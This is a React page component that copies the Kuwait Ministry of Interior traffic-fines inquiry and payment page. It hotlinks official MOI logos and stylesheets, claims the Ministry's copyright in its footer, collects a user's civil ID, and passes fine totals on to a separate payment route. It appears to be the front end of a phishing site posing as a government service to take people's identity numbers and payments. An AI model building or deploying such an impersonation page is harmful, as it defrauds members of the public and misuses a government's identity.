import React, { useState, useEffect } from 'react';
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useToast } from "@/hooks/use-toast";

export default function Home() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [civilId, setCivilId] = useState("");
  const [enquiryType, setEnquiryType] = useState("1");
  const [results, setResults] = useState<any>(null);
  const [isSearching, setIsSearching] = useState(false);

  const queryMutation = trpc.fines.query.useMutation({
    onSuccess: (data) => {
      setIsSearching(false);
      if (data.success) {
        setResults(data);
        toast({ title: "تم جلب البيانات", description: `تم العثور على ${data.fines.length} مخالفات` });
      } else {
        toast({ variant: "destructive", title: "خطأ", description: data.errorMessage || "فشل الاستعلام" });
      }
    },
    onError: (err) => {
      setIsSearching(false);
      toast({ variant: "destructive", title: "خطأ", description: err.message });
    }
  });

  const handleInquire = () => {
    if (civilId.length < 8) {
      toast({ variant: "destructive", description: "يرجى إدخال الرقم المدني بشكل صحيح" });
      return;
    }
    setIsSearching(true);
    queryMutation.mutate({ civilId, enquiryType: enquiryType as "1" | "2", lang: "ar" });
  };

  const handlePay = () => {
    if (!results) return;
    sessionStorage.setItem("paymentData", JSON.stringify({
      selectedFines: results.fines,
      totalAmount: results.totalAmount,
      civilId: civilId
    }));
    setLocation("/payment");
  };

  useEffect(() => {
    // Inject official MOI CSS directly into document head
    const cssLinks = [
      "https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css",
      "https://www.moi.gov.kw/main/lib/fontawesome/v7/css/all.css",
      "https://www.moi.gov.kw/main/css/site.css?v=go_4IccMhw1NChPOSH_W7AbpThLoN7-zMHFe4trNRE0"
    ];
    
    cssLinks.forEach(href => {
      if (!document.querySelector(`link[href="${href}"]`)) {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = href;
        document.head.appendChild(link);
      }
    });

    document.body.style.backgroundImage = "url('https://www.moi.gov.kw/main/images/assets/common/bg-pattern.png')";
    document.body.style.backgroundRepeat = "repeat";
    document.body.style.backgroundColor = "#e9e6de";

    return () => {
      document.body.style.backgroundImage = "";
      document.body.style.backgroundColor = "";
    };
  }, []);

  return (
    <div className="moi-main-wrapper" dir="rtl">
      <style>{`
        .moi-main-wrapper { min-height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .moi-header { background: transparent; padding: 20px 0; }
        .moi-nav { background-color: #000576 !important; border-radius: 0; }
        .moi-sidebar { background-color: #000576; border-radius: 0; overflow: hidden; }
        .moi-sidebar .list-group-item { background: transparent; color: white; border-color: rgba(255,255,255,0.1); padding: 15px; font-size: 14px; }
        .moi-sidebar .list-group-item.active { background-color: rgba(255,255,255,0.1); border-color: white; }
        .moi-card { background: rgba(255,255,255,0.9); border: none; border-radius: 0; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .moi-footer { background-color: #000576; color: white; padding: 30px 0; margin-top: 50px; }
        .btn-inquire { background-color: #000576; color: white; border: none; height: 45px; font-weight: bold; }
        .btn-inquire:hover { background-color: #000350; color: white; }
        .results-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center; z-index: 10000; }
        .results-card { background: white; width: 90%; max-width: 450px; padding: 30px; border-radius: 10px; border: 4px solid #000576; text-align: center; }
        
        @media (max-width: 991px) {
          .moi-sidebar { margin-bottom: 20px; }
          .moi-header img { height: 70px !important; }
        }
      `}</style>

      <div className="container">
        <header className="moi-header">
          <div className="row align-items-center">
            <div className="col-4 col-md-2 text-center">
              <img src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg" style={{height: '100px'}} alt="MOI Logo" />
            </div>
            <div className="col-8 col-md-10 text-right">
              <img src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg" style={{height: '30px', marginBottom: '5px'}} alt="State of Kuwait" /><br />
              <img src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg" style={{height: '25px'}} alt="Ministry of Interior" />
            </div>
          </div>
        </header>

        <nav className="navbar navbar-expand-lg navbar-dark moi-nav mt-2">
          <div className="container">
            <button className="navbar-toggler" type="button" data-toggle="collapse" data-target="#moiNav">
              <span className="navbar-toggler-icon"></span>
            </button>
            <div className="collapse navbar-collapse show" id="moiNav">
              <ul className="navbar-nav ml-auto">
                <li className="nav-item active"><a className="nav-link" href="#">الرئيسيــة</a></li>
                <li className="nav-item"><a className="nav-link" href="#">الخدمات الإلكترونيـة</a></li>
                <li className="nav-item"><a className="nav-link" href="#">إدارات توعوية</a></li>
              </ul>
            </div>
          </div>
        </nav>

        <div className="row mt-4">
          <div className="col-lg-3">
            <div className="moi-sidebar shadow-sm">
              <div className="p-3 text-center font-weight-bold border-bottom border-light" style={{color: 'white'}}>الإدارة العامة للمرور</div>
              <div className="list-group list-group-flush">
                <a href="#" className="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                  <span>الخدمات الالكترونية لرخص السوق</span>
                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-renew-license.svg" style={{width: '20px'}} />
                </a>
                <a href="#" className="list-group-item list-group-item-action active d-flex justify-content-between align-items-center">
                  <span>دفع المخالفات</span>
                  <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" style={{width: '20px', filter: 'brightness(0) invert(1)'}} />
                </a>
                <a href="#" className="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                  <span>نظام مواعيد اختبار القيادة</span>
                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-booking.svg" style={{width: '20px'}} />
                </a>
                <a href="#" className="list-group-item list-group-item-action d-flex justify-content-between align-items-center">
                  <span>معاملات المرور</span>
                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/ico-procedures.svg" style={{width: '20px'}} />
                </a>
              </div>
            </div>
          </div>

          <div className="col-lg-9">
            <div className="card moi-card p-4">
              <div className="text-center mb-4">
                <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/logo-general-traffic.svg" style={{height: '80px'}} />
                <h4 className="mt-3 font-weight-bold" style={{color: '#000576'}}>الإدارة العامة للمرور</h4>
                <hr style={{width: '40%', borderColor: '#000576', borderWidth: '2px'}} />
              </div>

              <div className="form-group text-right">
                <label className="font-weight-bold" style={{color: '#000576'}}>Enquiry Type</label>
                <select className="form-control" value={enquiryType} onChange={e => setEnquiryType(e.target.value)}>
                  <option value="1">الأفراد</option>
                  <option value="2">الشركات</option>
                </select>
              </div>

              <div className="form-group text-right">
                <label className="font-weight-bold" style={{color: '#000576'}}>الرقم المدني أو الرقم الموحد</label>
                <input 
                  type="text" 
                  className="form-control text-right" 
                  placeholder="أدخل الرقم المدني" 
                  value={civilId} 
                  onChange={e => setCivilId(e.target.value.replace(/\D/g, ''))} 
                />
              </div>

              <button className="btn btn-inquire btn-block mt-4" onClick={handleInquire}>إستعلم</button>
              
              <p className="text-center mt-4 small font-weight-bold">
                بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
              </p>

              <div className="d-flex justify-content-center mt-2">
                <span className="badge badge-success p-2 mx-2">قابلة للدفع الكترونياً</span>
                <span className="badge badge-danger p-2 mx-2">غير قابلة للدفع الكترونياً</span>
              </div>
            </div>

            {/* Mobile Icons */}
            <div className="d-lg-none mt-4">
              <div className="row">
                <div className="col-6 mb-3 text-center">
                  <div className="bg-white rounded-circle shadow-sm mx-auto d-flex align-items-center justify-content-center" style={{width: '80px', height: '80px', border: '3px solid #000576'}}>
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" style={{width: '40px'}} />
                  </div>
                  <div className="mt-2 small font-weight-bold">دفع المخالفات</div>
                </div>
                <div className="col-6 mb-3 text-center">
                  <div className="bg-white rounded-circle shadow-sm mx-auto d-flex align-items-center justify-content-center" style={{width: '80px', height: '80px', border: '3px solid #000576'}}>
                    <img src="https://www.moi.gov.kw/main/images/assets/common/ico-case-track.svg" style={{width: '40px'}} />
                  </div>
                  <div className="mt-2 small font-weight-bold">سير القضية</div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <footer className="moi-footer text-center">
          <div className="container">
            <div className="mb-3">
              <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-youtube.svg" className="mx-2" style={{width: '24px'}} />
              <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-instagram.svg" className="mx-2" style={{width: '24px'}} />
              <img src="https://www.moi.gov.kw/main/images/assets/social-media/ico-twitter.svg" className="mx-2" style={{width: '24px'}} />
            </div>
            <p className="mb-0 small">© جميع الحقوق محفوظة لوزارة الداخلية-دولة الكويت - 2026</p>
          </div>
        </footer>
      </div>

      {isSearching && (
        <div className="loading-spinner-overlay" style={{position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.5)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 10001}}>
          <div className="spinner-border text-white" role="status"></div>
        </div>
      )}

      {results && (
        <div className="results-overlay">
          <div className="results-card">
            <h4 className="font-weight-bold mb-4" style={{color: '#000576'}}>نتائج الاستعلام</h4>
            <div className="text-right mb-4">
              <p><strong>الرقم المدني:</strong> {civilId}</p>
              <p><strong>عدد المخالفات:</strong> {results.fines.length}</p>
              <p><strong>الإجمالي:</strong> <span className="text-danger font-weight-bold" style={{fontSize: '20px'}}>{results.totalAmount} د.ك</span></p>
            </div>
            <div className="d-flex gap-2">
              <button className="btn btn-primary flex-grow-1 font-weight-bold" style={{backgroundColor: '#000576'}} onClick={handlePay}>دفع الآن</button>
              <button className="btn btn-secondary flex-grow-1 font-weight-bold" onClick={() => setResults(null)}>إغلاق</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
